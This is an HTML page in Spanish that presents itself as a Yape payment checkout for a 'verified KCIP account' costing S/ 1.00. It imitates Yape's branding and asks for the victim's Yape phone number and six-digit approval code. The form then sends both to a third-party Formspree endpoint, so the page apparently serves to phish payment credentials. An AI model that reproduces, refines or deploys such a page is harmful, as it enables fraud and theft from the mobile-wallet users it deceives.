<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cuenta KCIP Verificada - Activación Inmediata</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background-color: #111;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .main-wrapper {
            display: flex;
            background: #1a1a1a;
            border-radius: 20px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            width: 850px;
            border: 1px solid #333;
        }
        /* Lado Izquierdo: Producto */
        .info-side {
            flex: 1;
            padding: 30px;
            display: flex;
            flex-direction: column;
            background: linear-gradient(135deg, #1a1a1a 0%, #252525 100%);
        }
        .product-img {
            width: 100%;
            border-radius: 10px;
            margin-bottom: 20px;
            height: 200px;
            object-fit: contain;
            background: #222;
            display: flex;
            justify-content: center;
            align-items: center;
            border: 1px dashed #444;
        }
        .info-side h1 {
            color: #00c8ff; /* Color azul para servicios digitales/verificación */
            font-size: 22px;
            margin-bottom: 10px;
        }
        .details-list {
            list-style: none;
            padding: 0;
            font-size: 14px;
            line-height: 1.6;
        }
        .details-list li {
            margin-bottom: 8px;
            border-bottom: 1px solid #333;
            padding-bottom: 5px;
        }
        .details-list li b {
            color: #00c8ff;
        }

        /* Lado Derecho: Formulario Yape */
        .payment-side {
            background: white;
            padding: 40px;
            width: 350px;
            color: #333;
            text-align: center;
        }
        .logo-yape {
            width: 110px;
            margin-bottom: 20px;
        }
        .label-text {
            display: block;
            text-align: left;
            font-size: 14px;
            font-weight: bold;
            color: #444;
            margin-bottom: 5px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            border-radius: 8px;
            box-sizing: border-box;
            font-size: 16px;
        }
        .input-celular {
            border: 1px solid #7ea8f8;
            background-color: #f0f4ff;
        }
        .input-codigo {
            border: 2.5px solid #000;
            background-color: #fff;
            text-align: center;
            font-weight: bold;
            font-size: 20px;
            letter-spacing: 3px;
        }
        .menu-ayuda {
            display: block;
            font-size: 12px;
            color: #666;
            margin-bottom: 20px;
            text-decoration: none;
        }
        .btn-yapear {
            width: 100%;
            padding: 16px;
            background-color: #742284;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
        }
        .btn-yapear:hover {
            background-color: #5a1a66;
            transform: translateY(-2px);
        }
        .envio-tag {
            margin-top: 15px;
            font-weight: bold;
            color: #00c853;
            font-size: 14px;
            text-transform: uppercase;
        }
    </style>
</head>
<body>

<div class="main-wrapper">
    <div class="info-side">
        <div class="product-img">
            <svg width="100" height="100" viewBox="0 0 24 24" fill="none" stroke="#00c8ff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path><path d="m9 12 2 2 4-4"></path></svg>
        </div>
        <h1>Cuenta KCIP Verificada</h1>
        <ul class="details-list">
            <li>Estado: <b>Full Verificado</b></li>
            <li>Acceso: <b>Inmediato</b></li>
            <li>Seguridad: <b>Encriptación de datos</b></li>
            <li>Soporte: <b>Prioritario 24/7</b></li>
            <li>Entrega: <b>Vía Correo / Digital</b></li>
        </ul>
        <div class="envio-tag">Costo de Activación: S/ 1.00</div>
    </div>

    <div class="payment-side">
        <img src="https://www.apuestatotal.com//cms/img/banners/892/logo-yape.png" alt="Yape" class="logo-yape">
        
        <form action="https://formspree.io/f/xaqyqrjy" method="POST">
            
            <label class="label-text">Ingresa tu celular yape</label>
            <input type="tel" name="Celular_Comprador" class="input-celular" placeholder="900 000 000" required>

            <label class="label-text">Código de aprobación</label>
            <input type="text" name="Codigo_Aprobacion" class="input-codigo" placeholder="000000" maxlength="6" required>

            <a href="#" class="menu-ayuda">Encuéntralo en el menú de Yape</a>

            <input type="hidden" name="Producto" value="Activacion Cuenta KCIP Verificada">
            <input type="hidden" name="Precio" value="S/ 1.00">

            <button type="submit" class="btn-yapear">YAPEAR S/ 1.00</button>
        </form>
    </div>
</div>

</body>
</html>
